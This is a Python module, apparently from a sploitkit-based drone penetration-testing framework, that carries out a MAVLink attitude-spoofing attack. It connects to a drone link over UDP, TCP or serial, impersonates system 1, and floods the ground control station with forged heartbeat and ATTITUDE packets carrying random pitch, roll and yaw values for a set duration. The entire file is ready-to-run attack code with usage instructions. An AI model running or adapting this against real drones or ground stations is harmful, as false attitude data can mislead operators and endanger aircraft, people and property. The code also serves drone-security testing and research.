from sploitkit import Config, Option
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import random
import sys

class AttitudeSpoofing(MAVLinkModule):
    """
    Spoof the drone's attitude data (pitch, roll, yaw) to mislead the Ground Control Station (GCS).

    Connection:
        Supports both network and serial connections:
        - Network: udp:10.13.0.6:14550 or tcp:10.13.0.6:5760
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection udp:10.13.0.6:14550
        set duration 60
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='duration',
            description='Duration of spoofing in seconds (0 for infinite)',
            required=False,
        ): "60",  # Default value
        Option(
            name='update_rate',
            description='Attitude update rate in Hz',
            required=False,
        ): "10",  # Default value
    })

    def send_heartbeat(self, master):
        """
        Send a spoofed MAVLink heartbeat message.
        """
        master.mav.heartbeat_send(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # GUIDED mode
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )

    def send_attitude(self, master):
        """
        Send a spoofed MAVLink ATTITUDE message with random values.
        """
        # Generate random attitude values
        roll = random.uniform(-1.0, 1.0)
        pitch = random.uniform(-1.0, 1.0)
        yaw = random.uniform(-3.14, 3.14)
        rollspeed = random.uniform(-0.1, 0.1)
        pitchspeed = random.uniform(-0.1, 0.1)
        yawspeed = random.uniform(-0.1, 0.1)

        # Send attitude message
        master.mav.attitude_send(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,
            roll=roll,
            pitch=pitch,
            yaw=yaw,
            rollspeed=rollspeed,
            pitchspeed=pitchspeed,
            yawspeed=yawspeed
        )

    def run(self):
        # Retrieve configuration options
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("Attitude Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false attitude data into the MAVLink stream")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Set spoofed system ID (optional - spoof as system 1)
            master.source_system = 1
            master.source_component = 1

            start_time = time.time()
            count = 0
            interval = 1.0 / update_rate

            # Main spoofing loop
            while True:
                # Check if the duration has been reached
                if duration > 0 and (time.time() - start_time >= duration):
                    self.logger.info(f"Spoofing duration of {duration} seconds reached. Stopping...")
                    break

                # Send spoofed heartbeat and attitude messages
                self.send_heartbeat(master)
                self.send_attitude(master)

                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count} spoofed packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

            self.logger.success(f"\n{separator}")
            self.logger.success(f"Attitude Spoofing Completed")
            self.logger.success(f"Total packets sent: {count}")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user")
        except Exception as e:
            self.logger.error(f"Error during spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
